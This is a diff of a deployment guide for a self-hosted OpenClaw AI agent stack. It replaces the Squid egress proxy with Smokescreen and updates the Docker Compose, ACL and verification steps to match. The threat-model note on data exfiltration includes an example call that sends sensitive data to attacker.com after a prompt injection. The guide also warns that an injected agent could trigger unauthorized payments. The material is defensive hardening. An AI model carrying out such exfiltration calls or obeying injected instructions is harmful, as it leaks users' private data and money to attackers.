@@ -31,7 +31,7 @@ A single server with Docker Compose gives you socket proxy, egress whitelist, sa
           │                      │                      │
   ┌───────▼───────┐   ┌─────────▼────────┐   ┌────────▼────────┐
   │ docker-proxy  │   │  openclaw (gw)   │   │ openclaw-egress │
-  │ (socket proxy)│   │  (main service)  │   │ (Squid proxy)   │
+  │ (socket proxy)│   │  (main service)  │   │ (Smokescreen)   │
   │ [openclaw-net]│   │ [openclaw-net +  │   │ [openclaw-net + │
   └───────────────┘   │  proxy-net]      │   │  egress-net]    │
           │           └──────────────────┘   └────────┬────────┘
@@ -114,8 +114,8 @@ Tokens and encryption keys left empty in `vault.yml` are auto-generated on first
 | Ansible Role | Guide Steps | What It Does |
 |-------------|-------------|-------------|
 | `base` | 1-2 | SSH hardening, Docker install, daemon tuning, sysctl, UFW, fail2ban, Cloudflare ingress |
-| `openclaw-config` | 3 | Squid config, LiteLLM config, Docker Compose file, `.env` with secrets |
-| `openclaw-deploy` | 4 | `docker compose up`, wait for healthy, tighten Squid ACL to actual subnet |
+| `openclaw-config` | 3 | Smokescreen ACL, LiteLLM config, Docker Compose file, `.env` with secrets |
+| `openclaw-deploy` | 4 | Build Smokescreen image, `docker compose up`, wait for healthy |
 | `openclaw-harden` | 5 | Gateway auth, sandbox isolation, resource caps, tool denials, SOUL.md |
 | `openclaw-integrate` | 6-8 | LiteLLM as model proxy, Telegram channel, Voyage AI memory index |
 | `reverse-proxy` | 9 | Caddy (default), Cloudflare Tunnel, or Tailscale Serve |
@@ -197,8 +197,8 @@ ansible/
 ├── playbook.yml                       # Orchestrates all roles in deployment order
 └── roles/
     ├── base/                          # SSH, Docker, sysctl, UFW, fail2ban
-    ├── openclaw-config/               # Squid, LiteLLM, Compose, .env templates
-    ├── openclaw-deploy/               # docker compose up, health wait, ACL tighten
+    ├── openclaw-config/               # Smokescreen, LiteLLM, Compose, .env templates
+    ├── openclaw-deploy/               # Build egress image, docker compose up, health wait
     ├── openclaw-harden/               # 30+ config set commands, SOUL.md, security audit
     ├── openclaw-integrate/            # Model proxy, Telegram, memory index
     ├── reverse-proxy/                 # Caddy / Tunnel / Tailscale (conditional)
@@ -329,7 +329,7 @@ EOF
 systemctl restart docker
 ```
 
-> **Why `storage-driver` and `dns`?** Explicitly setting `overlay2` avoids Docker's auto-detection logic on first start (which can pick suboptimal drivers on some Ubuntu kernels). Custom DNS resolvers prevent container DNS resolution from falling back to the host's `systemd-resolved` stub, which adds ~50ms latency per lookup — noticeable when Squid resolves LLM provider domains. `max-concurrent-downloads` speeds up image pulls during updates without saturating the NIC.
+> **Why `storage-driver` and `dns`?** Explicitly setting `overlay2` avoids Docker's auto-detection logic on first start (which can pick suboptimal drivers on some Ubuntu kernels). Custom DNS resolvers prevent container DNS resolution from falling back to the host's `systemd-resolved` stub, which adds ~50ms latency per lookup — noticeable when the egress proxy resolves LLM provider domains. `max-concurrent-downloads` speeds up image pulls during updates without saturating the NIC.
 
 #### System Tuning
 
@@ -447,62 +447,63 @@ mkdir -p /opt/openclaw/{config,monitoring/{logs,backups}}
 chmod 700 /opt/openclaw /opt/openclaw/monitoring /opt/openclaw/monitoring/logs /opt/openclaw/monitoring/backups
 ```
 
-#### Squid Egress Config
+#### Smokescreen Egress Proxy
 
-> **Data exfiltration control**: The Squid proxy is often described as a cost control (limiting which LLM providers the agent can reach), but it is also the most important data exfiltration prevention in this deployment. If a prompt injection attack succeeds and convinces the agent to call `web_fetch("https://attacker.com/?data=<sensitive>")`, Squid blocks it because `attacker.com` is not on the whitelist. Every domain you add to the whitelist is a potential exfiltration channel — add only what the agent genuinely needs.
+> **Data exfiltration control**: The egress proxy is the most important data exfiltration prevention in this deployment. If a prompt injection attack succeeds and convinces the agent to call `web_fetch("https://attacker.com/?data=<sensitive>")`, Smokescreen blocks it because `attacker.com` is not on the whitelist. Every domain you add is a potential exfiltration channel — add only what the agent genuinely needs.
+>
+> **Why Smokescreen over Squid**: [Smokescreen](https://github.com/stripe/smokescreen) is Stripe's purpose-built egress proxy for domain whitelisting. It's a single Go binary with a YAML config — no cache management, no spool directories, no tmpfs mounts. It also validates that resolved IPs are publicly routable, blocking SSRF attacks even if a whitelisted domain resolves to an internal address.
 >
 > **x402 autonomous payments**: If you enable x402 payment capability (a fork/extension of OpenClaw), the egress whitelist must include payment provider endpoints. This creates a direct tension: whitelisting payment providers means a prompt-injected agent could trigger unauthorized payments. Defer enabling x402 until you have a separate, tightly scoped whitelist and explicit operator approval flows.
 
+First, create the Dockerfile for building Smokescreen from source:
+
 ```bash
-cat > /opt/openclaw/config/squid.conf << 'EOF'
-http_port 3128
+mkdir -p /opt/openclaw/build/smokescreen
 
-# Only allow HTTPS port (443)
-acl Safe_ports port 443
-http_access deny !Safe_ports
+cat > /opt/openclaw/build/smokescreen/Dockerfile << 'EOF'
+FROM golang:1.22-alpine AS builder
+RUN apk add --no-cache git
+WORKDIR /src
+RUN git clone https://github.com/stripe/smokescreen.git . && \
+    CGO_ENABLED=0 go build -ldflags="-s -w" -o /smokescreen .
 
-# Restrict client source to the Docker bridge subnet.
-# Find it with: docker network inspect openclaw-net --format '{{range .IPAM.Config}}{{.Subnet}}{{end}}'
-# Default bridge subnets are typically 172.x.0.0/16 — update after first deploy.
-acl localnet src 172.16.0.0/12
-http_access deny !localnet
+FROM alpine:3.20
+RUN apk add --no-cache ca-certificates curl && \
+    adduser -D -H smokescreen
+COPY --from=builder /smokescreen /usr/local/bin/smokescreen
+USER smokescreen
+ENTRYPOINT ["smokescreen"]
+EOF
+```
 
-# Whitelist LLM provider API domains (see Step 6 for full provider list)
-# WARNING: every domain added here is a potential data exfiltration channel.
-# Only whitelist providers you actively use.
-acl llm_apis dstdomain .anthropic.com
-acl llm_apis dstdomain .openai.com
-# Memory embeddings (required for Voyage AI memory — Step 8)
-acl llm_apis dstdomain .voyageai.com
-# Uncomment providers as you add their API keys in Step 6:
-# acl llm_apis dstdomain .x.ai               # xAI Grok
-# acl llm_apis dstdomain .groq.com            # Groq
-# acl llm_apis dstdomain .googleapis.com      # Google Gemini
-# acl llm_apis dstdomain .deepseek.com        # DeepSeek
-# acl llm_apis dstdomain .openrouter.ai       # OpenRouter
-# acl llm_apis dstdomain .baidubce.com        # Baidu Qianfan
+Then create the ACL config — this is the domain whitelist:
 
-# CONNECT tunneling (used for all HTTPS requests through the proxy)
-acl CONNECT method CONNECT
-http_access deny CONNECT !llm_apis
-http_access allow CONNECT llm_apis
+```bash
+cat > /opt/openclaw/config/smokescreen-acl.yaml << 'EOF'
+---
+# Smokescreen egress ACL — enforce mode denies all traffic except
+# to listed domains. Smokescreen also verifies resolved IPs are
+# publicly routable (blocks RFC 1918 / link-local / loopback).
+version: v1
 
-# Allow plain HTTP(S) forwarding to whitelisted domains only
-http_access allow llm_apis
+services: []
 
-# Deny everything else
-http_access deny all
-
-# Hardening
-via off
-forwarded_for delete
-httpd_suppress_version_string on
-
-# Memory tuning — keep Squid lean (container limit: 256 MB)
-cache_mem 32 MB
-maximum_object_size_in_memory 256 KB
-# Disable disk cache — this proxy only tunnels CONNECT requests to LLM APIs
-cache deny all
+default:
+  project: openclaw
+  action: enforce
+  allowed_domains:
+    # Core LLM providers
+    - "*.anthropic.com"
+    - "*.openai.com"
+    # Memory embeddings (required for Voyage AI memory — Step 8)
+    - "*.voyageai.com"
+    # Uncomment providers as you add their API keys in Step 6:
+    # - "*.x.ai"               # xAI Grok
+    # - "*.groq.com"            # Groq
+    # - "*.googleapis.com"      # Google Gemini
+    # - "*.deepseek.com"        # DeepSeek
+    # - "*.openrouter.ai"       # OpenRouter
+    # - "*.baidubce.com"        # Baidu Qianfan
 EOF
 ```
 
@@ -534,7 +535,7 @@ model_list:
       rpm: 300
 
   # ── Embedding Model (for semantic cache) ───────────────────────────
-  # Voyage AI is already whitelisted in Squid (Step 3) and provisioned
+  # Voyage AI is already whitelisted in Smokescreen (Step 3) and provisioned
   # for OpenClaw memory (Step 8). voyage-3-lite is the cheapest option
   # at $0.02/1M tokens — cache embedding calls cost fractions of a cent.
   - model_name: "voyage-cache-embed"
@@ -641,8 +642,8 @@ services:
     container_name: openclaw
     environment:
       DOCKER_HOST: tcp://openclaw-docker-proxy:2375
-      HTTP_PROXY: http://openclaw-egress:3128
-      HTTPS_PROXY: http://openclaw-egress:3128
+      HTTP_PROXY: http://openclaw-egress:4750
+      HTTPS_PROXY: http://openclaw-egress:4750
       NO_PROXY: openclaw-docker-proxy,openclaw-litellm,localhost,127.0.0.1
       OPENCLAW_DISABLE_BONJOUR: "1"
       # Performance: disable Node.js DNS lookup caching lag in bridge networks
@@ -689,8 +690,8 @@ services:
       VOYAGE_API_KEY: "${VOYAGE_API_KEY}"
       REDIS_HOST: "openclaw-redis"
       REDIS_PORT: "6379"
-      HTTP_PROXY: http://openclaw-egress:3128
-      HTTPS_PROXY: http://openclaw-egress:3128
+      HTTP_PROXY: http://openclaw-egress:4750
+      HTTPS_PROXY: http://openclaw-egress:4750
       NO_PROXY: openclaw-redis,localhost,127.0.0.1
     networks:
       - openclaw-net
@@ -715,23 +716,30 @@ services:
     restart: unless-stopped
 
   openclaw-egress:
-    image: ubuntu/squid:6.6-24.04_edge
+    build:
+      context: ./build/smokescreen
+      dockerfile: Dockerfile
     container_name: openclaw-egress
+    command:
+      - "--egress-acl-file=/etc/smokescreen/acl.yaml"
+      - "--listen-ip=0.0.0.0"
+      - "--expose-prometheus-metrics"
+      - "--prometheus-listen-ip=0.0.0.0"
+      - "--deny-range=10.0.0.0/8"
+      - "--deny-range=172.16.0.0/12"
+      - "--deny-range=192.168.0.0/16"
     volumes:
-      - ./config/squid.conf:/etc/squid/squid.conf:ro
+      - ./config/smokescreen-acl.yaml:/etc/smokescreen/acl.yaml:ro
     networks:
       - openclaw-net
       - egress-net
     read_only: true
     tmpfs:
-      - /var/spool/squid:size=64M
-      - /var/log/squid:size=32M
-      - /run:size=8M
       - /tmp:size=16M
     security_opt:
       - no-new-privileges:true
     healthcheck:
-      test: ["CMD-SHELL", "squid -k check 2>/dev/null || exit 1"]
+      test: ["CMD", "curl", "-sf", "http://localhost:4750/healthcheck"]
       interval: 30s
       timeout: 5s
       retries: 3
@@ -740,7 +748,7 @@ services:
       resources:
         limits:
           cpus: "0.5"
-          memory: 256M
+          memory: 128M
     restart: unless-stopped
 
   redis:
@@ -796,11 +804,11 @@ COMPOSE_EOF
 > **Network design**: Three networks enforce least-privilege communication:
 > - **`openclaw-net`** (`internal: true`) — inter-service traffic only; containers cannot reach the internet.
 > - **`proxy-net`** — reverse proxy (Step 9) reaches the gateway without joining the internal network.
-> - **`egress-net`** — gives `openclaw-egress` (Squid) a route to the internet for whitelisted LLM API domains.
+> - **`egress-net`** — gives `openclaw-egress` (Smokescreen) a route to the internet for whitelisted LLM API domains.
 >
 > The `openclaw` service is on `openclaw-net` + `proxy-net`. The egress proxy is on `openclaw-net` + `egress-net`. The docker-proxy and Redis stay on `openclaw-net` only — fully isolated.
 >
-> **Known trade-off**: `proxy-net` is not `internal` (Caddy needs it to reach Let's Encrypt for ACME challenges). This means the `openclaw` Gateway process — but not sandbox containers (`network=none`) — has an internet-routable network interface. Well-behaved HTTP clients honor `HTTPS_PROXY` and route through Squid, but a subprocess that ignores proxy env vars could bypass the egress whitelist. If using Cloudflare Tunnel instead of Caddy (Option B, Step 9), you can add `internal: true` to `proxy-net` to close this gap.
+> **Known trade-off**: `proxy-net` is not `internal` (Caddy needs it to reach Let's Encrypt for ACME challenges). This means the `openclaw` Gateway process — but not sandbox containers (`network=none`) — has an internet-routable network interface. Well-behaved HTTP clients honor `HTTPS_PROXY` and route through Smokescreen, but a subprocess that ignores proxy env vars could bypass the egress whitelist. If using Cloudflare Tunnel instead of Caddy (Option B, Step 9), you can add `internal: true` to `proxy-net` to close this gap.
 
 ### Step 4: Deploy
 
@@ -834,19 +842,22 @@ All five containers should show `healthy` status within 60 seconds. If `openclaw
 docker compose logs openclaw --tail 50
 ```
 
-#### Tighten Squid ACL (Post-Deploy)
+#### Verify Egress Proxy (Post-Deploy)
 
-After the first deploy, lock down the Squid `localnet` ACL to the actual bridge subnet:
+Smokescreen doesn't need source IP ACL tightening — Docker's `internal: true` network handles that. Verify the proxy is blocking correctly:
 
 ```bash
-SUBNET=$(docker network inspect openclaw-net --format '{{range .IPAM.Config}}{{.Subnet}}{{end}}')
-echo "Bridge subnet: $SUBNET"
+# Should succeed (whitelisted domain)
+docker exec openclaw \
+  curl -sf -o /dev/null -w '%{http_code}' \
+  -x http://openclaw-egress:4750 https://api.anthropic.com
+# Expected: 200
 
-# Update squid.conf with the real subnet
-sed -i "s|acl localnet src 172.16.0.0/12|acl localnet src $SUBNET|" /opt/openclaw/config/squid.conf
-
-# Restart Squid to pick up the change
-docker compose restart openclaw-egress
+# Should fail (non-whitelisted domain)
+docker exec openclaw \
+  curl -sf -o /dev/null -w '%{http_code}' \
+  -x http://openclaw-egress:4750 https://example.com 2>&1
+# Expected: 503 (proxy denied)
 ```
 
 ### Step 5: Gateway and Sandbox Hardening
@@ -1033,7 +1044,7 @@ docker compose restart openclaw
 
 ### Step 6: API Keys and Model Configuration
 
-OpenClaw routes to LLM providers via the Squid egress proxy (Step 3). You need at least **one inference provider** and **Voyage AI** for memory embeddings.
+OpenClaw routes to LLM providers via the Smokescreen egress proxy (Step 3). You need at least **one inference provider** and **Voyage AI** for memory embeddings.
 
 #### Supported Providers
 
@@ -1052,7 +1063,7 @@ OpenClaw routes to LLM providers via the Squid egress proxy (Step 3). You need a
 
 > **Choosing a provider**: Anthropic Claude Opus 4.6 is the recommended default for tool-enabled agents — it has the strongest instruction-following and injection resistance. Use Groq or DeepSeek for cost-sensitive workloads where tool execution is disabled. vLLM eliminates external API calls entirely but requires GPU compute.
 >
-> **Egress domain column**: Each provider you enable must be whitelisted in the Squid ACL (Step 3). The domains listed above are the ones to add to `acl llm_apis dstdomain`. Only whitelist providers you actually use.
+> **Egress domain column**: Each provider you enable must be whitelisted in the Smokescreen ACL (Step 3). The domains listed above are the ones to add to `allowed_domains` in `smokescreen-acl.yaml`. Only whitelist providers you actually use.
 
 #### Configure API Keys
 LLM provider API keys are managed by LiteLLM (configured in `/opt/openclaw/.env` during Step 4). OpenClaw routes all model requests through LiteLLM — keys never enter the OpenClaw container.
@@ -1169,7 +1180,7 @@ docker compose restart openclaw
 
 ### Step 8: Memory and RAG Configuration
 
-**Prerequisites**: Voyage AI API key provisioned in Step 6. Squid egress whitelist includes `.voyageai.com` (Step 3).
+**Prerequisites**: Voyage AI API key provisioned in Step 6. Smokescreen egress whitelist includes `*.voyageai.com` (Step 3).
 
 ```bash
 docker exec -it openclaw sh
@@ -1358,7 +1369,7 @@ docker exec openclaw-redis redis-cli info memory | grep used_memory_human
 docker exec openclaw-redis redis-cli dbsize
 
 # ── Resource Limits (64 GB budget) ──────────────────────────────────
-# Base: 16G openclaw + 2G litellm + 256M proxy + 256M squid + 512M redis = ~19G
+# Base: 16G openclaw + 2G litellm + 256M proxy + 128M smokescreen + 512M redis = ~19G
 # Sandboxes: 8 × 1G = ~8G peak → total ~27G
 # Monitoring overlay adds ~544M (256M prometheus + 256M grafana + 32M exporter)
 # Remaining ~36G covers: OS page cache, Docker daemon, reverse proxy, growth
@@ -1367,11 +1378,11 @@ docker stats --no-stream
 # ── Network Connectivity ─────────────────────────────────────────────
 # Egress proxy — whitelisted domains (should succeed)
 docker exec openclaw \
-  curl -x http://openclaw-egress:3128 -I https://api.anthropic.com
+  curl -x http://openclaw-egress:4750 -I https://api.anthropic.com
 
 # Egress proxy — non-whitelisted domain (should fail with 403)
 docker exec openclaw \
-  curl -x http://openclaw-egress:3128 -I https://example.com 2>&1 | head -5
+  curl -x http://openclaw-egress:4750 -I https://example.com 2>&1 | head -5
 
 # ── Auth Verification ────────────────────────────────────────────────
 # Gateway should reject unauthenticated requests
@@ -1529,12 +1540,12 @@ Local backups on the same box are not disaster recovery. Push encrypted backups 
 | Gateway unreachable | `docker compose logs openclaw` | Confirm `gateway.bind "0.0.0.0"`, check `trustedProxies` includes `proxy-net` subnet |
 | Gateway auth rejected | `docker exec openclaw openclaw config get gateway.auth.mode` | Re-run Step 5 auth section; verify `Authorization: Bearer <token>` header |
 | Agents can't reach LLM APIs | `docker exec openclaw wget -qO- http://openclaw-litellm:4000/health/liveliness` | Verify LiteLLM is healthy, check `agents.defaults.apiBase` points to `http://openclaw-litellm:4000`, check `ANTHROPIC_API_KEY` in `/opt/openclaw/.env` |
-| LiteLLM can't reach providers | `docker exec openclaw-litellm curl -x http://openclaw-egress:3128 -I https://api.anthropic.com` | Check squid.conf whitelist, verify `HTTP_PROXY` env var, check `localnet` ACL subnet |
-| Memory index fails | `docker exec openclaw openclaw memory index --verify` | Verify Voyage AI key, check `.voyageai.com` in squid.conf whitelist |
+| LiteLLM can't reach providers | `docker exec openclaw-litellm curl -x http://openclaw-egress:4750 -I https://api.anthropic.com` | Check `smokescreen-acl.yaml` whitelist, verify `HTTP_PROXY` env var |
+| Memory index fails | `docker exec openclaw openclaw memory index --verify` | Verify Voyage AI key, check `*.voyageai.com` in `smokescreen-acl.yaml` |
 | Telegram crashes / drops messages | `docker compose logs openclaw --tail 100 \| grep -i telegram` | Check channel token and pairing status. If upgrading from 2026.2.17, the streaming race condition was fixed in 2026.2.19 — remove legacy `streamMode "off"` if present |
 | Channel not connecting | `docker exec openclaw openclaw doctor` | Check channel token, verify `dmPolicy`, check pairing status |
 | Container keeps restarting | `docker compose logs <service> --tail 100` | Check resource limits (`docker stats`), verify config files are readable |
-| Squid blocks legitimate traffic | `docker logs openclaw-egress` | Check `squid.conf` ACLs, verify `localnet` matches `openclaw-net` subnet |
+| Egress proxy blocks legitimate traffic | `docker logs openclaw-egress` | Check `smokescreen-acl.yaml` allowed_domains, verify domain glob pattern matches (e.g., `*.anthropic.com`) |
 | Container OOM-killed | `dmesg \| grep -i oom`, `docker inspect <container> --format '{{.State.OOMKilled}}'` | Check `docker stats` — verify the OOM'd container's memory limit. On 64 GB host, individual container limits are the constraint, not total host memory. Increase the specific container's limit or reduce concurrent sandbox count |
 | High swap usage | `free -h`, `vmstat 1 5` | If swap > 1 GB consistently, reduce `agents.defaults.sandbox.docker.memoryLimit` or lower openclaw memory limit to 3G |
 | Config error after update | `docker exec openclaw openclaw doctor --repair` | Restore from backup: `docker exec openclaw cp /root/.openclaw/config.json.bak /root/.openclaw/config.json` and restart. See Step 5 backup note |
@@ -2165,11 +2176,11 @@ echo "  Health: $litellm_health"
 
 # 5. Egress proxy — whitelisted domain
 echo "── Egress Proxy ──"
-egress_status=$(docker exec openclaw curl -sf -o /dev/null -w "%{http_code}" -x http://openclaw-egress:3128 https://api.anthropic.com 2>/dev/null || echo "FAILED")
+egress_status=$(docker exec openclaw curl -sf -o /dev/null -w "%{http_code}" -x http://openclaw-egress:4750 https://api.anthropic.com 2>/dev/null || echo "FAILED")
 echo "  Anthropic API: $egress_status"
 
 # 6. Egress proxy — blocked domain
-blocked_status=$(docker exec openclaw curl -sf -o /dev/null -w "%{http_code}" -x http://openclaw-egress:3128 https://example.com 2>/dev/null || echo "BLOCKED")
+blocked_status=$(docker exec openclaw curl -sf -o /dev/null -w "%{http_code}" -x http://openclaw-egress:4750 https://example.com 2>/dev/null || echo "BLOCKED")
 echo "  example.com:   $blocked_status (expected: BLOCKED or 403)"
 
 # 7. Gateway auth
@@ -2205,7 +2216,8 @@ A pre-staged standby is a pre-provisioned server that mirrors the production con
 # On the standby server
 docker pull ghcr.io/openclaw/openclaw:2026.2.23
 docker pull ghcr.io/tecnativa/docker-socket-proxy:v0.4.2
-docker pull ubuntu/squid:6.6-24.04_edge
+# Build Smokescreen egress proxy image (built from source, not pulled)
+cd /opt/openclaw && docker compose build openclaw-egress
 docker pull ghcr.io/berriai/litellm:main-v1.81.3-stable
 docker pull redis/redis-stack-server:7.4.0-v3
 docker pull caddy:2-alpine    # if using Caddy
@@ -2520,8 +2532,8 @@ services:
     container_name: openclaw-secondary
     environment:
       DOCKER_HOST: tcp://openclaw-docker-proxy:2375
-      HTTP_PROXY: http://openclaw-egress:3128
-      HTTPS_PROXY: http://openclaw-egress:3128
+      HTTP_PROXY: http://openclaw-egress:4750
+      HTTPS_PROXY: http://openclaw-egress:4750
       NO_PROXY: openclaw-docker-proxy,openclaw-litellm,localhost,127.0.0.1
       OPENCLAW_DISABLE_BONJOUR: "1"
       NODE_OPTIONS: "--dns-result-order=ipv4first"
@@ -2661,7 +2673,7 @@ A `.vscode/mcp.json` file is included in this repository. It registers the OpenC
 
 > **Security note**: The auth token is stored in VS Code's secret storage — it is not written to disk in plaintext or committed to the repository. Rotate the token on the server (Step 11) and re-enter it in VS Code when prompted.
 
-> **Egress reminder**: Copilot-initiated tool calls route through the OpenClaw gateway and are subject to the same Squid egress whitelist as any other session. If a requested domain is not on the whitelist, the call will be blocked — this is intentional. Add domains to the whitelist (Step 3, Squid config) only if you trust them as data destinations.
+> **Egress reminder**: Copilot-initiated tool calls route through the OpenClaw gateway and are subject to the same Smokescreen egress whitelist as any other session. If a requested domain is not on the whitelist, the call will be blocked — this is intentional. Add domains to `smokescreen-acl.yaml` (Step 3) only if you trust them as data destinations.
 
 ---
 
